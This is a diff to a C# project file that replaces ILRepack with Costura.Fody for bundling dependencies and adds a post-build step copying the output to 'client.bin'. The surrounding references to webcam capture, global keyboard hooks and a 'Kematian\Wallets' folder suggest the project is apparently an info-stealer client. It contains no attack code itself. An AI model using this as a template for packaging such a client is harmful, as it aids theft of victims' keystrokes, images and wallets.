@@ -58,10 +58,13 @@
 	<ItemGroup>
 		<PackageReference Include="AForge.Video" Version="2.2.5" />
 		<PackageReference Include="AForge.Video.DirectShow" Version="2.2.5" />
-		<PackageReference Include="ILRepack.Lib.MSBuild.Task">
-			<Version>2.0.40</Version>
-			<PrivateAssets>all</PrivateAssets>
-			<IncludeAssets>runtime; build; native; contentfiles; analyzers; buildtransitive</IncludeAssets>
+		<PackageReference Include="Costura.Fody" Version="6.0.0">
+		  <PrivateAssets>all</PrivateAssets>
+		  <IncludeAssets>runtime; build; native; contentfiles; analyzers; buildtransitive</IncludeAssets>
+		</PackageReference>
+		<PackageReference Include="Fody" Version="6.9.2">
+		  <PrivateAssets>all</PrivateAssets>
+		  <IncludeAssets>runtime; build; native; contentfiles; analyzers; buildtransitive</IncludeAssets>
 		</PackageReference>
 		<PackageReference Include="MouseKeyHook">
 			<Version>5.7.1</Version>
@@ -74,4 +77,8 @@
 	<ItemGroup>
 		<Folder Include="Kematian\Wallets\" />
 	</ItemGroup>
+	<Target Name="CopyWindows" AfterTargets="Build" Condition="'$(OS)' == 'Windows_NT'">
+		<Exec Command='copy "$(TargetPath)" "$(TargetDir)client.bin" /Y' />
+	</Target>
+
 </Project>
